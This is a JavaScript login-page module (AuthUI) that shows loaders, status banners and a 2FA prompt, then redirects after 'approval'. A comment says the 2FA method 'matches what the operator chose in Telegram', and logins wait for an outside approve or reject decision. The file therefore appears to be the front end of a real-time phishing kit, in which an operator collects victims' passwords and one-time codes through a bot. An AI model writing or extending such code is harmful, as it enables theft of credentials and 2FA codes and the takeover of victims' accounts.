(function (global) {
    var overlayEl;
    var bannerEl;

    function init() {
        overlayEl = document.getElementById('authGateOverlay');
        bannerEl  = document.getElementById('authStatusBanner');
    }

    function setBanner(message, kind, targetId) {
        var el = targetId ? document.getElementById(targetId) : bannerEl;
        if (!el) return;
        el.textContent = message || '';
        el.hidden = !message;
        el.classList.remove('auth-banner--error', 'auth-banner--success');
        if (kind === 'error')   el.classList.add('auth-banner--error');
        if (kind === 'success') el.classList.add('auth-banner--success');
    }

    function clearBanner(targetId) {
        setBanner('', null, targetId);
    }

    function showLoader() {
        if (!overlayEl) return;
        overlayEl.hidden = false;
        overlayEl.setAttribute('aria-hidden', 'false');
    }

    function hideLoader() {
        if (!overlayEl) return;
        overlayEl.hidden = true;
        overlayEl.setAttribute('aria-hidden', 'true');
    }

    /** Show 2FA for a single method only — matches what the operator chose in Telegram ('email'|'phone'|'totp'). */
    function show2fa(twoFaType) {
        var loginView  = document.getElementById('loginView');
        var twoFaView  = document.getElementById('twoFaView');
        var forgotView = document.getElementById('forgotView');
        if (loginView)  loginView.style.display  = 'none';
        if (forgotView) forgotView.style.display  = 'none';
        if (twoFaView)  twoFaView.style.display   = '';

        var method = (twoFaType || 'email').toLowerCase();
        if (method !== 'email' && method !== 'phone' && method !== 'totp') {
            method = 'email';
        }

        if (twoFaView) {
            twoFaView.setAttribute('data-2fa-method', method);
        }

        var tabsStrip = document.getElementById('twoFaTabs');
        if (tabsStrip) {
            tabsStrip.hidden = true;
            tabsStrip.style.display = 'none';
        }

        var titleEl = document.getElementById('twoFaTitle');
        var descEl = document.getElementById('twoFaDesc');
        if (titleEl) {
            if (method === 'email') {
                titleEl.textContent = 'Verify your email';
            } else if (method === 'phone') {
                titleEl.textContent = 'Verify your phone';
            } else {
                titleEl.textContent = 'Authenticator app';
            }
        }
        if (descEl) {
            if (method === 'email') {
                descEl.textContent = 'Enter the 6-digit code sent to your email address.';
            } else if (method === 'phone') {
                descEl.textContent = 'Enter the 6-digit code sent via SMS to your phone.';
            } else {
                descEl.textContent = 'Enter the 6-digit code from your authenticator app.';
            }
        }

        var panels = {
            email: document.getElementById('twoFaPanelEmail'),
            phone: document.getElementById('twoFaPanelPhone'),
            totp:  document.getElementById('twoFaPanelTotp')
        };
        Object.keys(panels).forEach(function (key) {
            if (panels[key]) {
                panels[key].style.display = key === method ? '' : 'none';
            }
        });

        var inputMap = {
            email: 'twoFaEmailCode',
            phone: 'twoFaPhoneCode',
            totp:  'twoFaTotpCode'
        };
        var inputEl = document.getElementById(inputMap[method] || 'twoFaEmailCode');
        if (inputEl) setTimeout(function () { inputEl.focus(); }, 50);
    }

    /** Show main login view (used by back button in 2FA). */
    function showLogin() {
        var loginView  = document.getElementById('loginView');
        var twoFaView  = document.getElementById('twoFaView');
        var forgotView = document.getElementById('forgotView');
        if (twoFaView) {
            twoFaView.style.display = 'none';
            twoFaView.removeAttribute('data-2fa-method');
        }
        if (forgotView) forgotView.style.display  = 'none';
        if (loginView)  loginView.style.display   = '';
    }

    /**
     * runGate — wraps a login/2fa promise, handles all statuses:
     *   pending → polling continues (handled inside pollLoginStatus)
     *   approved → success banner + redirect
     *   rejected → error banner
     *   timeout  → error banner
     *   2fa      → show 2FA view, return { status:'2fa', two_fa_type, request_id }
     *              caller must wire up the 2FA submit flow
     */
    function runGate(fn) {
        clearBanner();
        showLoader();
        return fn()
            .then(function (result) {
                var status = result && result.status;
                hideLoader();

                if (status === 'approved') {
                    setBanner('You are now signed in.', 'success');
                    var cfg = global.APP_CONFIG || {};
                    var redirectUrl = String(cfg.afterLoginRedirectUrl || '').trim();
                    if (redirectUrl) {
                        var delay = Number(cfg.afterLoginRedirectDelayMs);
                        if (!Number.isFinite(delay) || delay < 0) delay = 0;
                        function go() { global.location.assign(redirectUrl); }
                        delay > 0 ? setTimeout(go, delay) : go();
                    }
                    return result;
                }

                if (status === '2fa') {
                    // Let caller handle — just surface the result
                    return result;
                }

                if (status === 'rejected') {
                    setBanner('Your account could not be verified. Please try again.', 'error');
                } else if (status === 'timeout') {
                    setBanner('The request timed out. Please try again.', 'error');
                } else {
                    setBanner('Something went wrong. Please try again.', 'error');
                }
                return result;
            })
            .catch(function (err) {
                hideLoader();
                setBanner('Something went wrong. Please try again.', 'error');
                throw err;
            });
    }

    global.AuthUI = { init, setBanner, clearBanner, runGate, hideLoader, show2fa, showLogin };
})(window);
